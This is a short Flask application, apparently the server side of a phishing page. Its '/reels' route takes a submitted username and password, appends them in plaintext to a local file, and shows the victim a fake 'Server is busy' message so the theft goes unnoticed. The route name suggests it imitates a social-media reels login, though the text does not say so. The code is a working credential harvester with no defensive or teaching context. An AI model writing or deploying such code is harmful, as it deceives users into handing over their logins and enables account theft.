from flask import Flask, render_template, request


app = Flask(__name__)
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/reels', methods = ['POST'])
def reels():
    user_name = request.form.get('username')
    password = request.form.get('password')
    a = [user_name,password]

    with open("data.txt", "a+") as f:
        f.write(f'{a}\n')

    return("Server is busy. Please try again after sometime")

